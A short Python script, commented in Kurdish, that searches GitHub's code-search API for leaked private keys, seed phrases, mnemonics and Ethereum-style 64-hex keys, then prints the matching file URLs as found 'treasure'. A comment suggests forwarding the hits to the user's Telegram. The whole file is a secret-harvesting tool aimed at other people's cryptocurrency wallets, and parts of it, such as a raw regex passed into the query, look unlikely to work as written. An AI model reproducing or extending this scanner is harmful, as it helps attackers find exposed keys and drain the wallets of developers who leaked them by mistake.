import requests
import re
import os

# 1. لیستی ئەو وشانەی کە کلیلەکان ئاشکرا دەکەن
KEYWORDS = [
    'export PRIVATE_KEY=', 
    'mnemonic:', 
    '"seed":', 
    '0x[a-fA-F0-9]{64}' # ئەمە شێوازی کلیلی ئیسێریۆمە
]

def search_github():
    print("🛰️ ڕووبۆتەکە دەستی کرد بە پشکنینی سێرڤەرەکانی جیهان...")
    # لێرەدا API بەکاردێت بۆ گەڕان لەناو کۆدە تازەکاندا
    # تێبینی: لێرەدا دەبێت TOKENی گیتھەبت هەبێت
    headers = {"Authorization": f"token {os.getenv('GH_TOKEN')}"}
    
    for word in KEYWORDS:
        url = f"https://api.github.com/search/code?q={word}+created:>2024-01-01"
        try:
            res = requests.get(url, headers=headers).json()
            if 'items' in res:
                for item in res['items']:
                    print(f"🎯 گەنجینە دۆزرایەوە لە: {item['html_url']}")
                    # لێرەدا دەتوانیت کۆدێک زیاد بکەیت کە نامە بۆ تێلێگرامت بنێرێت
        except:
            continue

if __name__ == "__main__":
    search_github()
